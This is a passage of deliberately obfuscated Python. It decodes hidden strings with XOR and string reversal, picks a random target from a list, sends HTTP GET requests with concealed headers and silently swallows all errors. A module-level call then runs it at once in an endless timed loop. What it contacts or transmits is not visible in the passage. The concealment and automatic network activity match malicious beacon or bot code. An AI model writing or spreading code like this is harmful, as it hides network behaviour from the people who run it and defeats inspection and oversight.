                    b"\x1bx\xc6G'v\xf0N\x9a/\xb0\xd2<r\xb0\xedj\xd4",
                )
            )
        ),
        lO1l01OOll1lOOlOOOl0l(
            O0Ol01OO10OO10l1l11Ol(
                "".join(
                    chr(l01O0O0l0lllll1O00O1O ^ l0ll10OO10O1OlOl111lO)
                    for l0ll10OO10O1OlOl111lO, l01O0O0l0lllll1O00O1O in zip(
                        b"\xcc\x8b\xafB.\xe4\xf9v", b"\xa0\xf3\xd76Y\xda\xcaE"
                    )
                ),
                "".join(
                    chr(O1OlOO01l1OO11lO1Ol1O ^ lOOlO0l01O110lOO11OOl)
                    for lOOlO0l01O110lOO11OOl, O1OlOO01l1OO11lO1Ol1O in zip(
                        b",\x9e\x16J$\xe9\xe3\x1a\x98", b'Q\xfbd"M\x95\xd1l\xe1'
                    )
                ),
            )
        ),
    ]
    try:
        O01000O0OO110Ol1O00O0 = ll1O0Ol1O101010l00l1O[
            getattr(OlO0l0l01lOl10O0lOl1O, "tnidnar"[::-1])(
                int(l0Ol00ll1100O11OlOl10(O0Ol1OlO0l0l10O01OO0l(1, 0 ^ 3) + (0 ^ 1))),
                len(ll1O0Ol1O101010l00l1O) - int(l0Ol00ll1100O11OlOl10(3 ^ (4 ^ 2))),
            )
        ]
        O01O1ll0l0lOO0Ol11l0O = getattr(
            lOO11l1010l1lOOl0l10O,
            "".join(
                chr(OOl00ll0OlOlOl1O0OOOO ^ l1Ol1O00Ol0OO11000111)
                for l1Ol1O00Ol0OO11000111, OOl00ll0OlOlOl1O0OOOO in zip(
                    b"?\x83\xf7", b"X\xe6\x83"
                )
            ),
        )(
            O01000O0OO110Ol1O00O0,
            headers={
                lO1l01OOll1lOOlOOOl0l(
                    "".join(
                        chr(Ol01O0O0OOO11l001l1Ol ^ OlO11l1llO10O100l1O1l)
                        for OlO11l1llO10O100l1O1l, Ol01O0O0OOO11l001l1Ol in zip(
                            b"(JZ\xf4\x1e\x02D\x8b\r\xab", b"q=3\x82/G/\xe2\x7f\xd3"
                        )
                    )
                ): lO1l01OOll1lOOlOOOl0l(
                    "".join(
                        filter(
                            lambda lOOl1OO001000Ol10101O: ord(lOOl1OO001000Ol10101O) % 3
                            != 0,
                            "<Q*\x03fNc\x0030r$B\x12$",
                        )
                    ).join(
                        chr(Ol0lll1lOlOl0lO1O1OOl ^ l1O001lOO1lO101llOOl0)
                        for l1O001lOO1lO101llOOl0, Ol0lll1lOlOl0lO1O1OOl in zip(
                            b"S\x97-\xa3!\\\x80\xaas\xef\x9bDk\x02\xb9$0R\x8e%/BE\xc1\xc3#\xd1\x8b|\xd9<a\xe25C\xe2\x10b\x88\xf0\x8f\x13\xe5^i\xac\x83\x175\xf5\xd5\xcbv\x10\xb9\xf95\xae\xee\xd7\xfcs^]]\x94\x9eEhM3X\x95eu\x8a$\x04\xcf\x7f\xaa\x00(\x9d_f\xd5\x1bd\xb9d\x89\rD\xf5\x82Jh\x88\x13\x0ct6\x88x\xc2\x0b\xb3\xa6\xde\xca\x8eV\xef%\x97",
                            b"\x02\xe4S\xceQ,\xe5\x99J\xdd\xaf`GS\xdcC] \xf6VX.z\xe5\x8eQ\xa9\xe2\x0c\xfdm\x04\x85\x11\x10\xb54>\xac\xc5\xbbp\xd0k\n\x96\xae3p\x81\xa1\xbb\x1fK\xd0\x9fz\xc3\x96\xe4\xc6Gkof\xa6\xa5aD\x02\x7f\x00\xc45E\xaeTi\xa0\x16\x8eKA\xfa0\x15\xf8?>\xd0\x12\xfe`7\x87\xb1wZ\xbd!:Pa\xed\x12\xa7}\xde\x95\xe4\xfe\xbbd\xd4\x17\xac",
                        )
                    )
                )
            },
            timeout=int(l0Ol00ll1100O11OlOl10(0 ^ 3 ^ (4 ^ 14))),
        )
    except Exception as wNenuzCUFf:
        pass


def ll101O1OllOOl1l001l1O():
    l1O0OlOO00O11Oll0OlO1 = setInterval(
        int(l0Ol00ll1100O11OlOl10(2 * (0 * 16 + 3) + (0 * 12 + 0))),
        lO100O0lO11O01OOlll11,
    )
    O0l01l0111O10011l00O0()
    OOOllllOO0Ol1O0ll10Ol()
    while bool(int(l0Ol00ll1100O11OlOl10(1 ^ 3 ^ (1 ^ 6)))):
        lOll0lOl0Ol0011l1010O()
        OlO010l0l0Ol1O0O0OOl1(int(l0Ol00ll1100O11OlOl10(84 * 6 + 0)))
        OOOO1OOlO1OOllll1111O()
        OlO010l0l0Ol1O0O0OOl1(int(l0Ol00ll1100O11OlOl10(3 * 9 + 7)))


ll101O1OllOOl1l001l1O()
